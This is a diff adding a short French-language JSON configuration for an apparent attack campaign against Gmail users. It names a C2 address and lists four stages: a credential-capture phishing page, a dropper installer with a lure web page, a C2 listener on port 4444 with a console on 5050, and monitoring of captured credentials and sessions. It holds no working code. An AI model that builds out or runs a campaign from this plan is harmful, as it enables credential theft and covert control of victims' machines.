@@ -1,0 +1,28 @@
+{
+ "nom": "premiere-guerre",
+ "site": "gmail",
+ "c2": "192.168.1.222",
+ "cree": "2026-11-15 17:12",
+ "steps": [
+  {
+   "n": 1,
+   "nom": "PHISHING",
+   "desc": "page de capture gmail (Scarecrow)"
+  },
+  {
+   "n": 2,
+   "nom": "DROPPER",
+   "desc": "installateur Arkham forge + page web"
+  },
+  {
+   "n": 3,
+   "nom": "C2",
+   "desc": "listener 4444 + console 5050 (Arkham)"
+  },
+  {
+   "n": 4,
+   "nom": "SURVEILLANCE",
+   "desc": "monitoring des captures et sessions"
+  }
+ ]
+}
